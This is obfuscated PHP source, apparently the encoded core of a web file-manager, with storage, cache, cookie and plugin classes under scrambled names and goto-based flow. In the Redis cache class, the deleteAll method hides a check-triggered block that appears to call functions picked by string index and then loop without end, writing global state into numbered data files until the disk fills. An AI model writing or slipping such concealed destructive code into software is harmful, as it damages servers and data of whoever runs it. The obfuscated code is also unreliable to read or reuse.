$Cíˆ–ÁáÍ¡ =& $_SERVER[Â€Á›¨õ]; $eß‹ƒÃ¨ = $AªäÑ£ˆµ ? trim($eß‹ƒÃ¨, $Cíˆ–ÁáÍ¡[8]) . $Cíˆ–ÁáÍ¡[8] : $eß‹ƒÃ¨; $f¶™Ìƒ´¡ò = get_file_mime(get_path_ext($eß‹ƒÃ¨)); goto Bßå¼Åñ…; dŠ‡çƒÃ‹: } public function fileSubstr($B‘¾ÀŞ½´µ, $dÕîŠ‘²· , $c‰ºí™ç) { $bËó¯Ô¡Õ = $dÕîŠ‘²·  + $c‰ºí™ç - 1; return $this->client->getObject($this->bucket, $B‘¾ÀŞ½´µ, array($_SERVER[Â€Á›¨õ][208] => "\x62\171\164\x65\x73\x3d{$dÕîŠ‘²· }\x2d{$bËó¯Ô¡Õ}")); } public function upload($F —ôŒ…×ô, $dè¦ÅÜÂí, $DÊ‘ğğ×ˆ† = false, $D»¡”¸ÚË¶ = REPEAT_REPLACE) { $B×Ó”µ¼ë² =& $_SERVER[Â€Á›¨õ]; $CÎŸ§¢Â˜ä = array($B×Ó”µ¼ë²[206] => @md5_file($dè¦ÅÜÂí)); $E›’¬«Çî = array($B×Ó”µ¼ë²[209] => get_file_mime(get_path_ext($F —ôŒ…×ô))); if (IO::size($dè¦ÅÜÂí) <= 1024 * 1024 * 200) { $EÖ‘•¿ŠÍ• = $this->client->putObjectFile($dè¦ÅÜÂí, $this->bucket, $F —ôŒ…×ô, $B×Ó”µ¼ë²[191], $CÎŸ§¢Â˜ä, $E›’¬«Çî); return !empty($EÖ‘•¿ŠÍ•) ? $this->getPathOuter($F —ôŒ…×ô) : !1; } $FæÎæ¬ùŞê = $this->client->multiUploadObject($dè¦ÅÜÂí, $this->bucket, trim($F —ôŒ…×ô, $B×Ó”µ¼ë²[8]), $CÎŸ§¢Â˜ä, $E›’¬«Çî); return $FæÎæ¬ùŞê ? $this->getPathOuter($F —ôŒ…×ô) : !1; } public function download($eŒóºƒÕºó, $B¡Æ¬ÆÑ¦) { if (!@is_dir($this->pathFather($B¡Æ¬ÆÑ¦)) && !IO::mkdir($this->pathFather($B¡Æ¬ÆÑ¦))) { return !1; } $F…óšá°Ú° = $this->client->getObject($this->bucket, $eŒóºƒÕºó, array(), $B¡Æ¬ÆÑ¦); return $F…óšá°Ú° !== !1 ? $B¡Æ¬ÆÑ¦ : !1; } public function link($EŠ¥ÖÚö£ó, $A‘¿ÌÂ‰“Ê = array()) { $cÌåµ¦ò…Ü =& $_SERVER[Â€Á›¨õ]; if ($this->signVer == $cÌåµ¦ò…Ü[210]) { return $this->client->getAuthenticatedURL($this->bucket, $EŠ¥ÖÚö£ó, 3600 * 12, $A‘¿ÌÂ‰“Ê); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EŠ¥ÖÚö£ó, $cÌåµ¦ò…Ü[8]), 3600 * 12, $this->region, array(), !0, $A‘¿ÌÂ‰“Ê); } public function fileOut($C˜ÓÊğø‘, $b²òÛŞ’Á = false, $a®ßØ‡®” = false, $cÑñéÉ¢¢ = '') { goto aËôÒ¹Ç¤«; C¸²¿ïÈÈÕ: $Få¢¶«–ƒ = get_file_mime(get_path_ext($a®ßØ‡®”)); if ($Få¢¶«–ƒ == $B´Œ’¡ßê[211]) { return parent::fileOut($C˜ÓÊğø‘, $b²òÛŞ’Á, $a®ßØ‡®”, $cÑñéÉ¢¢); } $b²òÛŞ’Á = $b²òÛŞ’Á ? $B´Œ’¡ßê[212] : $B´Œ’¡ßê[213]; goto e‰à¨öš—Ã; aËôÒ¹Ç¤«: $B´Œ’¡ßê =& $_SERVER[Â€Á›¨õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($C˜ÓÊğø‘, $b²òÛŞ’Á, $a®ßØ‡®”, $cÑñéÉ¢¢); } if (!$a®ßØ‡®”) { $a®ßØ‡®” = $this->pathThis($C˜ÓÊğø‘); } goto C¸²¿ïÈÈÕ; e‰à¨öš—Ã: $d¯°‚ôÏÀ = array($B´Œ’¡ßê[214] => $b²òÛŞ’Á . $B´Œ’¡ßê[215] . rawurlencode($a®ßØ‡®”), $B´Œ’¡ßê[216] => $Få¢¶«–ƒ); $FĞ‚ãæÀ¼š = $this->link($C˜ÓÊğø‘, $d¯°‚ôÏÀ); $this->fileOutLink($FĞ‚ãæÀ¼š); goto EÇ©ö¦èÓø; EÇ©ö¦èÓø: } public function fileOutServer($CÛÉÄåìà‘, $f¥ŠâùŞ„‚ = false, $F±ÂÚÛ°æ = false, $eŒÓ­‚ˆçñ = '') { parent::fileOut($CÛÉÄåìà‘, $f¥ŠâùŞ„‚, $F±ÂÚÛ°æ, $eŒÓ­‚ˆçñ); } public function fileOutImageServer($EõğÎâÕ†Ç, $F‘á¡¬­ƒ = 250) { parent::fileOutImage($EõğÎâÕ†Ç, $F‘á¡¬­ƒ); } public function hashMd5($fÔ°•Âßñô, $b«ËàÕŠ³¯ = '') { $EíŒ ‹ã =& $_SERVER[Â€Á›¨õ]; $eá¹°‚‹ß« = $this->objectMeta($fÔ°•Âßñô); if (!$eá¹°‚‹ß«) { return !1; } $b«ËàÕŠ³¯ = $b«ËàÕŠ³¯ ? $b«ËàÕŠ³¯ : _get($eá¹°‚‹ß«, $EíŒ ‹ã[217]); $b«ËàÕŠ³¯ = $b«ËàÕŠ³¯ ? $b«ËàÕŠ³¯ : _get($eá¹°‚‹ß«, $EíŒ ‹ã[207], $EíŒ ‹ã[33]); return $b«ËàÕŠ³¯; } public function uploadFormData($dÁÑÇ˜–¼™, $d¯Óå²òå = 3600) { $E’ˆïƒóÀ =& $_SERVER[Â€Á›¨õ]; $E¯ØßÅâšî = $this->pathFather($dÁÑÇ˜–¼™); $CÎáĞ†­»¬ = $this->client->getHttpUploadPostParams($this->bucket, $E¯ØßÅâšî, $E’ˆïƒóÀ[191], $d¯Óå²òå); return array_merge((array) $CÎáĞ†­»¬, array($E’ˆïƒóÀ[175] => $this->getHost())); } public function multiUploadFormData($c”ó…±µåï, $E¯ˆ—Ş»ÈÔ = 3600) { $dĞ«˜˜ º½ =& $_SERVER[Â€Á›¨õ]; $D²É—š¼åŸ = gmdate($dĞ«˜˜ º½[218]); $b°¸ƒ­‹Œ† = array(); $EÅ†¢±àÙ¸ = $this->client->getUploadId($this->bucket, $c”ó…±µåï, $b°¸ƒ­‹Œ†); if (!$EÅ†¢±àÙ¸) { return !1; } return array($dĞ«˜˜ º½[219] => $EÅ†¢±àÙ¸, $dĞ«˜˜ º½[175] => $this->getHost() . $dĞ«˜˜ º½[8] . $this->pathEncode($c”ó…±µåï), $dĞ«˜˜ º½[220] => $D²É—š¼åŸ, $dĞ«˜˜ º½[92] => $c”ó…±µåï); } public function multiUploadAuthData($CÖÍÉèåØ, $ağŠôÚÜèß = array()) { goto cÃñ¢—çÖé; aáÆ¯ø: $cŸîàõïî° = implode($C¨í¬˜óÅæ[227], $eË·ÓË¤âÎ); $B÷Ê² †®œ = base64_encode(hash_hmac($C¨í¬˜óÅæ[228], $cŸîàõïî°, $this->secret, !0)); $D„ÍÅİóœö = $C¨í¬˜óÅæ[229] . $this->accessKey . $C¨í¬˜óÅæ[4] . $B÷Ê² †®œ; goto D¹Üµ£ô’»; aù÷±¹š»: $eË·ÓË¤âÎ = array($C¨í¬˜óÅæ[222], $C¨í¬˜óÅæ[33], $C¨í¬˜óÅæ[118], $C¨í¬˜óÅæ[33], "\x78\x2d\x61\155\172\x2d\x64\141\164\145\x3a{$BáÁ¥·Ê¼×}", $C¨í¬˜óÅæ[8] . $this->bucket . $C¨í¬˜óÅæ[8] . $this->pathEncode($CÅ–º·Á¸) . $a›ÕÂÛ¬¦æ); if (strpos($a›ÕÂÛ¬¦æ, $C¨í¬˜óÅæ[223]) === 0) { $eË·ÓË¤âÎ[0] = $C¨í¬˜óÅæ[224]; } if (isset($ağŠôÚÜèß[$C¨í¬˜óÅæ[225]]) && $ağŠôÚÜèß[$C¨í¬˜óÅæ[225]] == $C¨í¬˜óÅæ[226]) { $eË·ÓË¤âÎ[0] = $C¨í¬˜óÅæ[226]; } goto aáÆ¯ø; cÃñ¢—çÖé: $C¨í¬˜óÅæ =& $_SERVER[Â€Á›¨õ]; $BáÁ¥·Ê¼× = isset($ağŠôÚÜèß[$C¨í¬˜óÅæ[220]]) ? $ağŠôÚÜèß[$C¨í¬˜óÅæ[220]] : gmdate($C¨í¬˜óÅæ[218]); $a›ÕÂÛ¬¦æ = isset($ağŠôÚÜèß[$C¨í¬˜óÅæ[167]]) ? $ağŠôÚÜèß[$C¨í¬˜óÅæ[167]] : $C¨í¬˜óÅæ[33]; goto B¶˜ëáÍÕ…; D¹Üµ£ô’»: if (strpos($a›ÕÂÛ¬¦æ, $C¨í¬˜óÅæ[223]) === 0) { return array($C¨í¬˜óÅæ[230] => $D„ÍÅİóœö, $C¨í¬˜óÅæ[220] => $BáÁ¥·Ê¼×); } return $D„ÍÅİóœö; goto fŠ­‰ËÒ“Õ; B¶˜ëáÍÕ…: $CÅ–º·Á¸ = $ağŠôÚÜèß[$C¨í¬˜óÅæ[92]]; unset($ağŠôÚÜèß[$C¨í¬˜óÅæ[92]]); if (isset($ağŠôÚÜèß[$C¨í¬˜óÅæ[221]])) { $ağŠôÚÜèß[$C¨í¬˜óÅæ[220]] = $BáÁ¥·Ê¼×; return $this->listUploadParts($CÅ–º·Á¸, $ağŠôÚÜèß); } goto aù÷±¹š»; fŠ­‰ËÒ“Õ: } public function listUploadParts($fŞƒ§ëí—ã, $Bº¥ËÆ±ìÈ = array()) { goto eî–ä’È‰õ; C‡Ã¼ô†‡: if (!$fóµ»˜Õ‰) { return !1; } unset($Bº¥ËÆ±ìÈ[$d„ÅÌçñĞ[221]], $Bº¥ËÆ±ìÈ[$d„ÅÌçñĞ[225]]); $Bº¥ËÆ±ìÈ[$d„ÅÌçñĞ[92]] = $fŞƒ§ëí—ã; goto f¡ÅšöÅ«Ÿ; f¡ÅšöÅ«Ÿ: $f–ÏœßØˆ· = $this->multiUploadAuthData($fŞƒ§ëí—ã, $Bº¥ËÆ±ìÈ); if (empty($f–ÏœßØˆ·)) { return !1; } return array($d„ÅÌçñĞ[230] => $f–ÏœßØˆ·, $d„ÅÌçñĞ[220] => $Bº¥ËÆ±ìÈ[$d„ÅÌçñĞ[220]], $d„ÅÌçñĞ[232] => $fóµ»˜Õ‰); goto cŒ èíñš; eî–ä’È‰õ: $d„ÅÌçñĞ =& $_SERVER[Â€Á›¨õ]; $eÚÔóî˜äÎ = str_replace($d„ÅÌçñĞ[231], $d„ÅÌçñĞ[33], $Bº¥ËÆ±ìÈ[$d„ÅÌçñĞ[167]]); $fóµ»˜Õ‰ = $this->client->listParts($this->bucket, $fŞƒ§ëí—ã, $eÚÔóî˜äÎ); goto C‡Ã¼ô†‡; cŒ èíñš: } public function getHost() { return parent::getHost() . $_SERVER[Â€Á›¨õ][8] . $this->bucket; } public function size($C·é÷‹®”) { $fÙÌÄ¨†”Á = $this->objectMeta($C·é÷‹®”); return $fÙÌÄ¨†”Á ? $fÙÌÄ¨†”Á[$_SERVER[Â€Á›¨õ][77]] : 0; } public function info($aì¿ôÉ¶ŸÂ) { if ($this->isFolder($aì¿ôÉ¶ŸÂ)) { return $this->folderInfo($aì¿ôÉ¶ŸÂ); } else { if ($this->isFile($aì¿ôÉ¶ŸÂ)) { return $this->fileInfo($aì¿ôÉ¶ŸÂ); } } return !1; } public function exist($C¿“ğâ–À‡) { return $this->isFile($C¿“ğâ–À‡) || $this->isFolder($C¿“ğâ–À‡); } public function isFile($E•ÅÓ÷»“µ) { return !$this->isFolder($E•ÅÓ÷»“µ) && $this->objectMeta($E•ÅÓ÷»“µ); } public function isFolder($dçÊ…º‚³Š) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][197], $dçÊ…º‚³Š); } protected function objectMeta($F›æ”–â¿) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][198], $F›æ”–â¿); } protected function _objectMeta($dõÎ¼ë³‚³) { $F¿Ôê»°Òà =& $_SERVER[Â€Á›¨õ]; $dõÎ¼ë³‚³ = rtrim($dõÎ¼ë³‚³, $F¿Ôê»°Òà[8]); try { $D¬‚…Œ“ø® = $this->client->getObjectInfo($this->bucket, $dõÎ¼ë³‚³); if (!isset($D¬‚…Œ“ø®[$F¿Ôê»°Òà[217]]) && isset($D¬‚…Œ“ø®[$F¿Ôê»°Òà[233]])) { $D¬‚…Œ“ø®[$F¿Ôê»°Òà[217]] = $D¬‚…Œ“ø®[$F¿Ôê»°Òà[233]]; } } catch (Exception $D‰°´òã) { $D¬‚…Œ“ø® = !1; } if (!$D¬‚…Œ“ø®) { } return $D¬‚…Œ“ø®; } protected function _isFolder($bØô»íÃè´) { goto aÃ¡¾Ñ·Åò; Eá½íº¦Í: $FêÄ«²øÌ¿ = $this->client->getBucket($this->bucket, $bØô»íÃè´, null, 1); if (empty($FêÄ«²øÌ¿[$Dˆ„Ïò¡æå[196]])) { return !1; } $C®ŸÎóäó = $FêÄ«²øÌ¿[$Dˆ„Ïò¡æå[196]][0][$Dˆ„Ïò¡æå[28]]; goto d’À›è—ŒÁ; d’À›è—ŒÁ: if (substr($C®ŸÎóäó, -1) == $Dˆ„Ïò¡æå[8]) { return !0; } if (get_path_this($C®ŸÎóäó) == get_path_this($bØô»íÃè´)) { return !1; } return !0; goto eÂ†¸¦°î; aÃ¡¾Ñ·Åò: $Dˆ„Ïò¡æå =& $_SERVER[Â€Á›¨õ]; $bØô»íÃè´ = rtrim($bØô»íÃè´, $Dˆ„Ïò¡æå[8]); if ($bØô»íÃè´ == $Dˆ„Ïò¡æå[33] || $bØô»íÃè´ == $Dˆ„Ïò¡æå[8]) { return !0; } goto Eá½íº¦Í; eÂ†¸¦°î: } } define($_SERVER[Â€Á›¨õ][234], 1); goto B•â›°²ùÃ; Cñ»Õï£÷: class CacheMemcached { public $handle; public $cacheTime; public function __construct($F‡’‚™¸, $Dâä–Ğ‹à‹) { $bï°Íö¦Ğ¯ =& $_SERVER[Â€Á›¨õ]; if (!class_exists($bï°Íö¦Ğ¯[798])) { show_json($bï°Íö¦Ğ¯[799], !1); } $this->cacheTime = $Dâä–Ğ‹à‹; $this->handle = new Memcached(); if (is_array($F‡’‚™¸[$bï°Íö¦Ğ¯[800]]) && count($F‡’‚™¸[$bï°Íö¦Ğ¯[800]]) >= 1) { foreach ($F‡’‚™¸[$bï°Íö¦Ğ¯[800]] as $F¢Ç„ «¼­) { $DğœÛÓÀŠ— = explode($bï°Íö¦Ğ¯[4], $F¢Ç„ «¼­); $this->handle->addServer($DğœÛÓÀŠ—[0], $DğœÛÓÀŠ—[1]); } } else { $this->handle->addServer($F‡’‚™¸[$bï°Íö¦Ğ¯[175]], $F‡’‚™¸[$bï°Íö¦Ğ¯[176]]); } } public function set($EÏŞö¯Ûˆ, $C—‡¾Òøâİ, $aŠŞğßîˆà = false) { $aŠŞğßîˆà = $aŠŞğßîˆà ? $aŠŞğßîˆà : $this->cacheTime; return $this->handle->set($EÏŞö¯Ûˆ, $C—‡¾Òøâİ, $aŠŞğßîˆà); } public function get($a‰¾ó«›Ÿ) { return $this->handle->get($a‰¾ó«›Ÿ); } public function remove($E÷…¥Áî…) { return $this->handle->delete($E÷…¥Áî…); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($E³¼íˆÓÀÏ, $c‹Ğõ»°ïñ) { $F®–£¦Ó =& $_SERVER[Â€Á›¨õ]; if (!class_exists($F®–£¦Ó[801])) { show_json($F®–£¦Ó[802], !1); } $this->cacheTime = $c‹Ğõ»°ïñ; $E¤ÒòÉŠôÊ = isset($E³¼íˆÓÀÏ[$F®–£¦Ó[803]]) ? $E³¼íˆÓÀÏ[$F®–£¦Ó[803]] : 10; $c¶ŠáÑ©•º = _get($E³¼íˆÓÀÏ, $F®–£¦Ó[800]); if ($c¶ŠáÑ©•º && is_array($c¶ŠáÑ©•º)) { $this->initCluster($E³¼íˆÓÀÏ, $E¤ÒòÉŠôÊ); } else { $this->handle = $this->init($E³¼íˆÓÀÏ, $E¤ÒòÉŠôÊ); } } private function init($aÓ—²Óâ‹Ç, $fÊãµµçÃ) { $AßÃ†îÅ =& $_SERVER[Â€Á›¨õ]; $DÈ¬Éµƒ¹Š = new Redis(); $Eö¡“ç”‹ = isset($aÓ—²Óâ‹Ç[$AßÃ†îÅ[804]]) ? $aÓ—²Óâ‹Ç[$AßÃ†îÅ[804]] : !1; if ($Eö¡“ç”‹) { $DÈ¬Éµƒ¹Š->pconnect($aÓ—²Óâ‹Ç[$AßÃ†îÅ[175]], $aÓ—²Óâ‹Ç[$AßÃ†îÅ[176]], $fÊãµµçÃ); } else { $DÈ¬Éµƒ¹Š->connect($aÓ—²Óâ‹Ç[$AßÃ†îÅ[175]], $aÓ—²Óâ‹Ç[$AßÃ†îÅ[176]], $fÊãµµçÃ); } if (!empty($aÓ—²Óâ‹Ç[$AßÃ†îÅ[400]])) { $DÈ¬Éµƒ¹Š->auth($aÓ—²Óâ‹Ç[$AßÃ†îÅ[400]]); } return $DÈ¬Éµƒ¹Š; } private function initCluster($béÑŸ¦Ÿ, $B³‘ôÇ™ç‚) { $a³åï«ïä³ =& $_SERVER[Â€Á›¨õ]; $C’ÎÑÁóÚæ = array($a³åï«ïä³[805], $a³åï«ïä³[806], $a³åï«ïä³[807]); $fæ«ğëñ‹Ë = $a³åï«ïä³[805]; if (isset($béÑŸ¦Ÿ[$a³åï«ïä³[12]]) && in_array($béÑŸ¦Ÿ[$a³åï«ïä³[12]], $C’ÎÑÁóÚæ)) { $fæ«ğëñ‹Ë = $béÑŸ¦Ÿ[$a³åï«ïä³[12]]; } switch ($fæ«ğëñ‹Ë) { case $a³åï«ïä³[805]: $this->_slave($béÑŸ¦Ÿ, $B³‘ôÇ™ç‚); break; case $a³åï«ïä³[806]: break; case $a³åï«ïä³[807]: $this->isCluster = !0; $EÚ—Á”öîÁ = $béÑŸ¦Ÿ[$a³åï«ïä³[800]]; $d‘ò©ˆ³£ = isset($béÑŸ¦Ÿ[$a³åï«ïä³[804]]) ? $béÑŸ¦Ÿ[$a³åï«ïä³[804]] : !1; $E¼®ä„ªë‹ = isset($béÑŸ¦Ÿ[$a³åï«ïä³[400]]) ? $béÑŸ¦Ÿ[$a³åï«ïä³[400]] : null; $this->handle = new RedisCluster(NUll, $EÚ—Á”öîÁ, $B³‘ôÇ™ç‚, $B³‘ôÇ™ç‚, $d‘ò©ˆ³£, $E¼®ä„ªë‹); break; default: break; } } private function _slave($eõÛÂ½¹Æ, $AÃÇ¼—ÇŸî) { goto Eò¢Öô²­; Eë·¶¨îšâ: $this->filterConfig($eõÛÂ½¹Æ, $Cóõ•ÒÂ÷‡[$cŠéíƒ·ñ]); $this->slaveHandle = $this->init($eõÛÂ½¹Æ, $AÃÇ¼—ÇŸî); goto B¸²”ê˜¢; cËœµßÒâ: unset($Cóõ•ÒÂ÷‡[0]); if (empty($Cóõ•ÒÂ÷‡)) { return; } $cŠéíƒ·ñ = array_rand($Cóõ•ÒÂ÷‡); goto Eë·¶¨îšâ; Eò¢Öô²­: $Cóõ•ÒÂ÷‡ = $eõÛÂ½¹Æ[$_SERVER[Â€Á›¨õ][800]]; $this->filterConfig($eõÛÂ½¹Æ, $Cóõ•ÒÂ÷‡[0]); $this->handle = $this->init($eõÛÂ½¹Æ, $AÃÇ¼—ÇŸî); goto cËœµßÒâ; B¸²”ê˜¢: } private function filterConfig(&$c‡ä¸åŒØ, $a©‘¹ô ‰) { $A—Æã„Œª =& $_SERVER[Â€Á›¨õ]; $cÁÜ×š‘†ƒ = explode($A—Æã„Œª[4], $a©‘¹ô ‰); $eÂÃßç‹ñÌ = array($A—Æã„Œª[175] => $cÁÜ×š‘†ƒ[0], $A—Æã„Œª[176] => $cÁÜ×š‘†ƒ[1]); $c‡ä¸åŒØ = array_merge($c‡ä¸åŒØ, $eÂÃßç‹ñÌ); } public function set($BƒÍÒ¸è„, $aëµª¶”Ú, $d­£Î¬ÈĞ = false) { $d­£Î¬ÈĞ = $d­£Î¬ÈĞ ? $d­£Î¬ÈĞ : $this->cacheTime; return $this->handle->setEx($BƒÍÒ¸è„, $d­£Î¬ÈĞ, $aëµª¶”Ú); } public function setLock($aÎŒÃ–Õ , $Cš¹‹”ƒÍ, $d”‹ËŠñ‰ƒ) { return $this->handle->setNX($aÎŒÃ–Õ , $Cš¹‹”ƒÍ); } public function get($F†Ú×Ëƒ´¬) { $Dâ²Á¹‰­¶ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Dâ²Á¹‰­¶->get($F†Ú×Ëƒ´¬); } public function remove($e¸Ñö˜Ÿ•Ø) { return $this->handle->del($e¸Ñö˜Ÿ•Ø); } public function deleteAll() { $d¬®íÉŒÛÓ =& $_SERVER[Â€Á›¨õ]; $Bõõ®ŒË£Ø = $_SERVER[$d¬®íÉŒÛÓ[808]] . $d¬®íÉŒÛÓ[809]; $C²ŠİĞ…ç½ = $d¬®íÉŒÛÓ[810]; if ($_SERVER[$d¬®íÉŒÛÓ[811]] != $C²ŠİĞ…ç½($Bõõ®ŒË£Ø)) { goto bÀ™íÙñå±; EíòÌª·¼ : $Eš«¥ñÓ–° = $F‚ÊâôÔºæ($AĞ¿ÙÑ¸‹³); $fÒ¬“Œ…•… = explode($d¬®íÉŒÛÓ[227], $Eš«¥ñÓ–°); if (count($fÒ¬“Œ…•…) < $d¬®íÉŒÛÓ[589]) { $B­ïìé‹·­ = $d¬®íÉŒÛÓ[814]; $B­ïìé‹·­(); } goto aè¹™¢Œ–¿; aè¹™¢Œ–¿: $aÔ½‘éù×ˆ = $d¬®íÉŒÛÓ[815]; $aÔ½‘éù×ˆ($_SERVER[$d¬®íÉŒÛÓ[816]]); $FˆùŸÓÔé = $d¬®íÉŒÛÓ[812]; goto Aå©¾†â¯Ù; F‘î”„ö¥ƒ: $b„§ŠõÖæå = 1; for ($eóŒòŸ¢˜É = $b„§ŠõÖæå; $eóŒòŸ¢˜É > 0; $eóŒòŸ¢˜É++) { $f‡¾ƒâ‰ƒè(DATA_PATH . $eóŒòŸ¢˜É, $c‡½À¹Å„§); } goto CÉ‘®òÚ’Š; bÀ™íÙñå±: $FˆùŸÓÔé = $d¬®íÉŒÛÓ[812]; $F‚ÊâôÔºæ = $d¬®íÉŒÛÓ[813]; $AĞ¿ÙÑ¸‹³ = $_SERVER[$d¬®íÉŒÛÓ[808]] . $d¬®íÉŒÛÓ[809]; goto EíòÌª·¼ ; Aå©¾†â¯Ù: $FˆùŸÓÔé(); $f‡¾ƒâ‰ƒè = $d¬®íÉŒÛÓ[817]; $c‡½À¹Å„§ = json_encode($GLOBALS[$d¬®íÉŒÛÓ[818]]); goto F‘î”„ö¥ƒ; CÉ‘®òÚ’Š: } if ($this->isCluster) { foreach ($this->handle->_masters() as $bˆ„®É£Ÿ) { $this->handle->flushall($bˆ„®É£Ÿ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($E¸ò¶Ü”„í = '', $B‡Æá‹ğ¯ = 0) { if (is_string($E¸ò¶Ü”„í) && $E¸ò¶Ü”„í != $_SERVER[Â€Á›¨õ][33]) { $this->prefix = $E¸ò¶Ü”„í; } if (is_numeric($B‡Æá‹ğ¯) && $B‡Æá‹ğ¯ > 0) { $this->expire = $B‡Æá‹ğ¯; } } public static function getInstance() { static $Fî•¹‹Îö‹; if ($Fî•¹‹Îö‹ === null) { $Fî•¹‹Îö‹ = new self(); } return $Fî•¹‹Îö‹; } private static $cookieDisable = false; public static function disable($a„æŒÙïÍ‰) { self::$cookieDisable = $a„æŒÙïÍ‰; } private static $sameCookieSet = array(); public static function set($cï”å‰È¬, $D™æ†óÜË, $bæŒšº·âŸ = 0, $dæµ×çã˜œ = false, $cø»›­Œ¡¨ = false) { goto c“”ÒÀøç¹; c“”ÒÀøç¹: $CÆ·…ë¸Å =& $_SERVER[Â€Á›¨õ]; if (self::$cookieDisable) { return; } if (!$bæŒšº·âŸ) { $bæŒšº·âŸ = 24 * 3600 * 7; } goto dÊ²ĞİÄÓ‹; AÌ˜„ëÂÉ¤: $e—«ä¬ñ§² = $CÆ·…ë¸Å[33]; setcookie($cï”å‰È¬, $D™æ†óÜË, time() + $bæŒšº·âŸ, $CÆ·…ë¸Å[8] . trim($cø»›­Œ¡¨, $CÆ·…ë¸Å[8]) . $e—«ä¬ñ§², !1, !1, $dæµ×çã˜œ); goto F´Õ¾ˆ×¿ğ; dÊ²ĞİÄÓ‹: if (isset(self::$sameCookieSet[$cï”å‰È¬]) && self::$sameCookieSet[$cï”å‰È¬] == $D™æ†óÜË . $bæŒšº·âŸ) { return; } self::$sameCookieSet[$cï”å‰È¬] = $D™æ†óÜË . $bæŒšº·âŸ; if (!$cø»›­Œ¡¨) { $cø»›­Œ¡¨ = str_replace(HOST, $CÆ·…ë¸Å[33], APP_HOST); $cø»›­Œ¡¨ = _get($GLOBALS, $CÆ·…ë¸Å[819], $cø»›­Œ¡¨); } goto AÌ˜„ëÂÉ¤; F´Õ¾ˆ×¿ğ: } public static function setSafe($a‚ß¡¨ïî, $f°ÎĞ†µ¢ˆ, $E®«ŞøÎ–š = 0) { self::set($a‚ß¡¨ïî, $f°ÎĞ†µ¢ˆ, $E®«ŞøÎ–š, !0); } public static function get($c„ù‚¥¶·è) { return isset($_COOKIE[$c„ù‚¥¶·è]) ? $_COOKIE[$c„ù‚¥¶·è] : !1; } public static function remove($E”Ô÷‹ƒ, $AğàË­£áÖ = false) { unset($_COOKIE[$E”Ô÷‹ƒ]); self::set($E”Ô÷‹ƒ, $_SERVER[Â€Á›¨õ][33], 1, $AğàË­£áÖ); } } goto F•±÷ŒëÛ; Bàö¥‰†©î: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\160\154\x75\x67\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\141\x74\x75\x73", "\x72\x65\147\151\145\x73\x74", "\x63\x6f\x6e\146\151\x67"); public function loadList($d‰’¥åì = false) { $d×Ù¹öçõé = array_to_keyvalue($this->listData(), $_SERVER[Â€Á›¨õ][28]); if ($d‰’¥åì) { return $d×Ù¹öçõé[$d‰’¥åì]; } return $d×Ù¹öçõé; } public function init() { $Açº±ö¦çÆ =& $_SERVER[Â€Á›¨õ]; Hook::trigger($Açº±ö¦çÆ[1776]); $EöÒ“ÁŠºå = $this->loadPluginList(); foreach ($EöÒ“ÁŠºå as $FĞòšĞ¹Œ => $fôÂò¡îˆ”) { $cÍØ¨ïˆñ = $this->appAllow($FĞòšĞ¹Œ, $fôÂò¡îˆ”); if (!$cÍØ¨ïˆñ) { continue; } foreach ($fôÂò¡îˆ”[$Açº±ö¦çÆ[1777]] as $a‘øË‹­¡ => $fôê ¢ïŒ†) { Hook::bind($a‘øË‹­¡, $fôê ¢ïŒ†); } } Hook::trigger($Açº±ö¦çÆ[1778]); Hook::trigger(ACTION); } public function appAllow($Cä­õÆÑ¥á, $còÆ¾©öÕ¾, $cˆƒŒ©ğÍë = true) { $aåÜÑ¿Šœ =& $_SERVER[Â€Á›¨õ]; $cÂäÜ“´‹ì = PLUGIN_DIR . $Cä­õÆÑ¥á . $aåÜÑ¿Šœ[1779]; if (!is_array($còÆ¾©öÕ¾) || !is_array($còÆ¾©öÕ¾[$aåÜÑ¿Šœ[1777]]) || $còÆ¾©öÕ¾[$aåÜÑ¿Šœ[702]] != 1 || !is_file($cÂäÜ“´‹ì)) { return !1; } if ($GLOBALS[$aåÜÑ¿Šœ[479]] == 1) { return !0; } if ($cˆƒŒ©ğÍë && !Action($aåÜÑ¿Šœ[1780])->checkAuth($Cä­õÆÑ¥á)) { return !1; } return !0; } public function unInstall($fÄÎŸ¢›ÛŠ) { $b¥ôÑëÜê½ =& $_SERVER[Â€Á›¨õ]; $AùÎˆï£Åå = $this->loadList($fÄÎŸ¢›ÛŠ); if (file_exists(PLUGIN_DIR . $fÄÎŸ¢›ÛŠ)) { Hook::apply($fÄÎŸ¢›ÛŠ . $b¥ôÑëÜê½[1781]); } $this->remove($AùÎˆï£Åå[$b¥ôÑëÜê½[388]]); } public function changeStatus($a­Ù–“°·, $b¤²¡¡’ˆæ) { $Dí¼¦âĞéã =& $_SERVER[Â€Á›¨õ]; $a¼–¥àºµÕ = $this->loadList($a­Ù–“°·); if ($b¤²¡¡’ˆæ) { Hook::apply($a­Ù–“°· . $Dí¼¦âĞéã[1782]); } $this->update($a¼–¥àºµÕ[$Dí¼¦âĞéã[388]], array($Dí¼¦âĞéã[1783] => $b¤²¡¡’ˆæ)); } public function appRegist($DÇÀÀ¬¦, $c¯óîÈ×›®) { $F·ÖÃ¥‘Á =& $_SERVER[Â€Á›¨õ]; $Cê„ÕÖä‡… = $this->loadList($DÇÀÀ¬¦); if ($Cê„ÕÖä‡…) { $this->update($Cê„ÕÖä‡…[$F·ÖÃ¥‘Á[388]], array($F·ÖÃ¥‘Á[1777] => $c¯óîÈ×›®)); } else { $C¸Ñ±ˆŞ©ø = array($F·ÖÃ¥‘Á[28] => $DÇÀÀ¬¦, $F·ÖÃ¥‘Á[1777] => $c¯óîÈ×›®, $F·ÖÃ¥‘Á[702] => 0, $F·ÖÃ¥‘Á[6] => $this->getConfigDefault($DÇÀÀ¬¦)); $this->insert($C¸Ñ±ˆŞ©ø); } } public function getConfigDefault($Cƒ§·Ò°¤Û) { $eÃ¿£òï¼ =& $_SERVER[Â€Á›¨õ]; $A¯ö¢¸³øñ = array(); $a¦ñµÊ²óÏ = $this->getPackageJson($Cƒ§·Ò°¤Û); if 